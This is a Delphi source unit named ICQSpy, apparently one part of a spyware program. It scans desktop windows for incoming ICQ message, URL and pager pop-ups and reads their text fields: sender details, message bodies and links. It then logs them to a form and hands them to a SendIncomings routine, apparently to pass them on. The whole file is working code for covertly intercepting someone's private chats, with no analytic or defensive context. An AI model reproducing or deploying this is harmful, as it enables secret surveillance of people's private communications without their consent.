unit ICQSpy;

interface
uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, ExtCtrls;

procedure CheckForMessages;

implementation
uses Unit1;
var No:Integer;
    loop:integer;
    MessageData:array[1..6] of string;
    Last20:array[1..20] of string;
    Cnt:Integer;

function WinText (hWnd : LongInt) : string;
var PC : PChar;
    L : integer;
begin
 L:=SendMessage (hWnd, WM_GETTEXTLENGTH, 0, 0);
 getmem (PC, L+1);
 SendMessage (hWnd, WM_GETTEXT, L+1, LongInt (PC));
 result:=PC;
end;

function FindSiteWindowMessage(Handle: Hwnd; Info: Pointer): Bool; stdcall;
begin
  Result := True;
  inc(no);
  if no=6 then MessageData[1]:=wintext(Handle);
  if no=8 then MessageData[2]:=wintext(Handle);
  if no=9 then MessageData[3]:=wintext(Handle);
  if no=32 then MessageData[4]:=wintext(Handle);
end;

function FindSiteWindowURL(Handle: Hwnd; Info: Pointer): Bool; stdcall;
begin
  Result := True;
  inc(no);
  if no=6 then MessageData[1]:=wintext(Handle);
  if no=8 then MessageData[2]:=wintext(Handle);
  if no=9 then MessageData[3]:=wintext(Handle);
  if no=27 then MessageData[4]:=wintext(Handle);
  if no=23 then MessageData[5]:=wintext(Handle);
end;

function FindSiteWindowWWP(Handle: Hwnd; Info: Pointer): Bool; stdcall;
begin
  Result := True;
  inc(no);
  if no=25 then MessageData[4]:=wintext(Handle);
end;

function FirstAndLast(s:String):String;
begin
 if length(s)<=40 then result:=s else
  result:=copy(s,1,20)+copy(s,length(s)-19,20);
end;

procedure CheckForMessages;
var i : longint;
    deja:boolean;
    wtext:string;
begin
 for i:=1 to 16384 do
  begin
   if (IsWindow (i)) and (IsWindowVisible(i))  then begin
    deja:=false;MessageData[6]:='';
    wtext:=wintext(i);
    if (copy(wtext,1,18)='Incoming Message [') then
     begin
       no:=0;
       EnumChildWindows(i,@FindSiteWindowMessage,0);
       MessageData[6]:='MSG';
      end;
    if (copy(wtext,1,22)='Incoming URL Message [') then
     begin
       no:=0;
       EnumChildWindows(i,@FindSiteWindowURL,0);
       MessageData[6]:='URL';
      end;
    if (copy(wtext,1,26)='Incoming WWPager Message [') then
     begin
       no:=0;
       EnumChildWindows(i,@FindSiteWindowWWP,0);
       MessageData[6]:='WWP';
      end;
    if (MessageData[6]<>'') then
    for loop:=1 to 20 do if MessageData[4]=Last20[loop] then deja:=true;
    if (not deja) and (MessageData[6]<>'') then
     begin
          inc(cnt);if cnt>20 then cnt:=1;
          Last20[cnt]:=MessageData[4];
          Form1.listbox1.items.clear;
          form1.listbox1.items.add(MessageData[1]);
          form1.listbox1.items.add(MessageData[2]);
          form1.listbox1.items.add(MessageData[3]);
          form1.listbox1.items.add(MessageData[4]);
          form1.listbox1.items.add(MessageData[5]);
          form1.listbox1.items.add(MessageData[6]);
          Form1.SendIncomings;
         end;
    end;
  end;
end; { End of procedure }



begin
cnt:=0; 
end.
 